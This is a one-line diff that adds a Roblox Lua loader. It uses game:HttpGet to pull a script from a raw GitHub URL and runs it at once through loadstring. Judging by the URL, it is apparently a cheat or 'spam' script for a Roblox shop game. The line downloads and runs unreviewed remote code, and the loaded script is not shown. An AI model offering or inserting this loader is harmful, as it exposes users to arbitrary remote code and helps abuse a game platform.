@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/run-a-sari-sari-store-spam6-euiqtj9rn5dljx.lua"))()
